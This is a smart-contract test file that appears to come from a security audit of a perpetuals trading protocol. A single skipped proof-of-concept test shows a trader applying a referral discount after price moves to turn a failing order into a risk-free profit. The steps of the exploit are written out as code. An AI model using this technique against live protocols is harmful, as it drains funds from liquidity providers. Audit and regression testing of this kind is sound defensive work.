import { expect } from "chai";
import { mine, time } from "@nomicfoundation/hardhat-network-helpers";
import { deployFixture } from "../../../utils/fixture";
import { expandDecimals, decimalToFloat } from "../../../utils/math";
import { getBalanceOf, getSyntheticTokenAddress, getSupplyOf } from "../../../utils/token";
import { getDepositCount, getDepositKeys, createDeposit, executeDeposit, handleDeposit } from "../../../utils/deposit";
import * as keys from "../../../utils/keys";
import { getAccountPositionCount, getPositionCount, getPositionKeys } from "../../../utils/position";
import {
  OrderType,
  getOrderCount,
  handleOrder,
  createOrder,
  executeOrder,
  getOrderKeys,
  DecreasePositionSwapType,
} from "../../../utils/order";
import { expectTokenBalanceIncrease } from "../../../utils/token";
import { grantRole } from "../../../utils/role";
import { executeLiquidation } from "../../../utils/liquidation";
import { ethers } from "hardhat";
import { TOKEN_ORACLE_TYPES } from "../../../utils/oracle";
import { BigNumber } from "ethers";
import { getIsAdlEnabled, updateAdlState, executeAdl } from "../../../utils/adl";
import { getPoolAmount, getMarketTokenPrice } from "../../../utils/market";
import { claimableCollateralAmountKey } from "../../../utils/keys";
import { createWithdrawal, executeWithdrawal, handleWithdrawal, getWithdrawalCount } from "../../../utils/withdrawal";
import { hashData, hashString, encodeData } from "../../../utils/hash";

describe("Guardian.GLOBAL-3", () => {
  const { provider } = ethers;

  let fixture;
  let user0, user1, user2, wallet;
  let reader,
    dataStore,
    oracle,
    depositVault,
    ethUsdMarket,
    ethUsdSpotOnlyMarket,
    wnt,
    usdc,
    exchangeRouter,
    orderHandler,
    referralStorage,
    orderVault,
    positionUtils,
    solAddr,
    positionStoreUtils,
    tokenUtils,
    wntAccurate,
    ethUsdAccurateMarket,
    marketUtils,
    solUsdMarket,
    config;
  let roleStore, decreasePositionUtils, executionFee, prices;
  let eventEmitter, adlUtils;

  beforeEach(async () => {
    fixture = await deployFixture();

    ({ wallet, user0, user1, user2 } = fixture.accounts);
    ({ executionFee, prices } = fixture.props);
    ({
      reader,
      dataStore,
      orderHandler,
      oracle,
      depositVault,
      ethUsdMarket,
      orderVault,
      ethUsdSpotOnlyMarket,
      tokenUtils,
      wnt,
      marketUtils,
      referralStorage,
      positionUtils,
      usdc,
      exchangeRouter,
      positionStoreUtils,
      roleStore,
      decreasePositionUtils,
      eventEmitter,
      wntAccurate,
      ethUsdAccurateMarket,
      solUsdMarket,
      config,
      adlUtils,
    } = fixture.contracts);

    await grantRole(roleStore, wallet.address, "LIQUIDATION_KEEPER");
    solAddr = getSyntheticTokenAddress("SOL");

    await handleDeposit(fixture, {
      create: {
        market: ethUsdMarket,
        longTokenAmount: expandDecimals(1000, 18),
        shortTokenAmount: expandDecimals(500 * 1000, 6),
      },
    });
  });

  it.skip("CRITICAL: Trader front-runs execution & changes the discount for a risk-free trade", async () => {
    // ** This PoC requires TODO POSU-X to be fixed
    // E.g. removing the double counting of fees.totalNetCostUsd in the cache.remainingCollateral
    // calculation on line 364 in PositionUtils.sol

    // Set positionFeeFactor
    await dataStore.setUint(keys.positionFeeFactorKey(ethUsdMarket.marketToken), decimalToFloat(5, 2)); // 5% fee

    // Register Referral Code that will be used
    const referralCode = hashData(["bytes32"], [hashString("REKT")]);
    await referralStorage.connect(user1).registerCode(referralCode);
    await referralStorage.setTier(1, 2500, 10000); // 25% discount code
    await referralStorage.setReferrerTier(user1.address, 1);

    const initialUSDCAmount = expandDecimals(2500, 6);

    // User1 makes a position of size 20 WNT
    const increaseParams = {
      account: user1,
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: usdc,
      initialCollateralDeltaAmount: initialUSDCAmount,
      sizeDeltaUsd: decimalToFloat(50 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      triggerPrice: expandDecimals(5000, 12),
      orderType: OrderType.LimitIncrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    await createOrder(fixture, increaseParams);

    const firstIncreaseOrderKey = (await getOrderKeys(dataStore, 0, 1))[0];

    // Without a trader discount the fees negate the initialCollateralDeltaAmount
    // and the order reverts with an EmptyPosition error.

    // Fees will be 5% multiplied by the sizeDeltaUsd
    // 0.05 * $50,000 = $2500
    // $2500 is exactly the value of our 2500 USDC collateral
    // Therefore the execution will revert with an EmptyPosition error

    // The execution reverts with an EmptyPosition error
    await expect(
      executeOrder(fixture, {
        key: firstIncreaseOrderKey,
        tokens: [wnt.address, wnt.address],
        minPrices: [expandDecimals(5000, 4), expandDecimals(4990, 4)],
        maxPrices: [expandDecimals(5000, 4), expandDecimals(4990, 4)],
        priceFeedTokens: [usdc.address],
        precisions: [8, 8],
      })
    ).to.be.reverted;

    // Time passes & the trader sees that price moves in their favor.
    // Now they decide to let their order get executed, so they apply a
    // discount code.
    await referralStorage.setHandler(exchangeRouter.address, true);

    await exchangeRouter.connect(user1).multicall(
      [
        exchangeRouter.interface.encodeFunctionData("sendWnt", [orderVault.address, expandDecimals(11, 18)]),
        exchangeRouter.interface.encodeFunctionData("createOrder", [
          {
            addresses: {
              receiver: user1.address,
              callbackContract: user2.address,
              market: ethUsdMarket.marketToken,
              initialCollateralToken: ethUsdMarket.longToken,
              swapPath: [ethUsdMarket.marketToken],
            },
            numbers: {
              sizeDeltaUsd: decimalToFloat(1000),
              initialCollateralDeltaAmount: 0,
              triggerPrice: decimalToFloat(4800),
              acceptablePrice: decimalToFloat(4900),
              executionFee,
              callbackGasLimit: "200000",
              minOutputAmount: 700,
            },
            orderType: OrderType.LimitIncrease,
            decreasePositionSwapType: DecreasePositionSwapType.SwapCollateralTokenToPnlToken,
            isLong: true,
            shouldUnwrapNativeToken: true,
          },
          referralCode,
        ]),
      ],
      { value: expandDecimals(11, 18) }
    );

    // Now the discount code gives 25% off fees
    // Now the total fees are $2500 * 3/4 = $1875
    // Leaving us with a position of size $50,000 and $625 of collateral
    await executeOrder(fixture, {
      key: firstIncreaseOrderKey,
      tokens: [wnt.address, wnt.address],
      minPrices: [expandDecimals(5000, 4), expandDecimals(4990, 4)],
      maxPrices: [expandDecimals(5000, 4), expandDecimals(4990, 4)],
      priceFeedTokens: [usdc.address],
      precisions: [8, 8],
    });

    const userPositions = await reader.getAccountPositions(dataStore.address, user1.address, 0, 5);
    expect(userPositions.length).to.eq(1);
    const userPosition = userPositions[0];

    expect(userPosition.numbers.sizeInUsd).to.eq(decimalToFloat(50 * 1000));
    expect(userPosition.addresses.collateralToken).to.eq(usdc.address);
    expect(userPosition.numbers.collateralAmount).to.eq(expandDecimals(625, 6));

    // Trader now tops up position with collateral so that they'll be able to execute the decrease
    const increaseCollateralParams = {
      account: user1,
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: usdc,
      initialCollateralDeltaAmount: initialUSDCAmount,
      sizeDeltaUsd: 0,
      acceptablePrice: expandDecimals(6001, 12),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    expect(await getOrderCount(dataStore)).to.eq(1);
    await createOrder(fixture, increaseCollateralParams);
    expect(await getOrderCount(dataStore)).to.eq(2);

    const increaseCollateralOrderkey = (await getOrderKeys(dataStore, 0, 2))[1];

    let order = await reader.getOrder(dataStore.address, increaseCollateralOrderkey);

    expect(order.numbers.sizeDeltaUsd).to.eq(0);
    expect(order.numbers.orderType).to.eq(OrderType.MarketIncrease);

    await executeOrder(fixture, {
      key: increaseCollateralOrderkey,
      tokens: [wnt.address],
      minPrices: [expandDecimals(6000, 4)], // Ether has risen to $6,000 in the current block
      maxPrices: [expandDecimals(6000, 4)],
      priceFeedTokens: [usdc.address],
      precisions: [8],
    });

    // The trader can immediately exit this position at the current
    // (higher) prices for risk-free profit
    const decreaseParams = {
      account: user1,
      market: ethUsdMarket,
      minOutputAmount: 0,
      initialCollateralToken: usdc,
      initialCollateralDeltaAmount: 0,
      sizeDeltaUsd: decimalToFloat(50 * 1000), // Close position
      acceptablePrice: expandDecimals(5999, 12),
      orderType: OrderType.MarketDecrease,
      isLong: true,
      shouldUnwrapNativeToken: false,
    };

    await createOrder(fixture, decreaseParams);

    const realizeProfitsOrderKey = (await getOrderKeys(dataStore, 0, 2))[1];
    expect(await getOrderCount(dataStore)).to.eq(2);
    expect(await getPositionCount(dataStore)).to.eq(1);

    order = await reader.getOrder(dataStore.address, realizeProfitsOrderKey);

    expect(order.numbers.sizeDeltaUsd).to.eq(decimalToFloat(50 * 1000));
    expect(order.numbers.orderType).to.eq(OrderType.MarketDecrease);

    const userWNTBalBefore = await wnt.balanceOf(user1.address);
    const userUSDCBalBefore = await wnt.balanceOf(user1.address);

    await executeOrder(fixture, {
      key: realizeProfitsOrderKey,
      tokens: [wnt.address],
      minPrices: [expandDecimals(6000, 4)], // Ether has risen to $6,000 in the current block
      maxPrices: [expandDecimals(6000, 4)],
      priceFeedTokens: [usdc.address],
      precisions: [8],
    });

    expect(await getPositionCount(dataStore)).to.eq(0);

    // Trader realizes risk-free profit
    // $1000 per ETH => 10 ETH position
    // $10,000 profit paid out in ETH
    // $10,000 / $6,000 => 1.6666667 ETH
    const profitAmount = ethers.utils.parseEther("1.666666666666666666");
    const collateralAmount = initialUSDCAmount.mul(2);

    // Fees on the way in = $1875
    // Fees on the way out = $1875
    const feesAmount = expandDecimals(1875, 6).mul(2);

    expect((await wnt.balanceOf(user1.address)).sub(userWNTBalBefore)).to.eq(profitAmount);
    expect((await usdc.balanceOf(user1.address)).sub(userUSDCBalBefore)).to.eq(collateralAmount.sub(feesAmount));

    // *Notice this can also be done by simply updating the discount share of an existing code.
  });
});
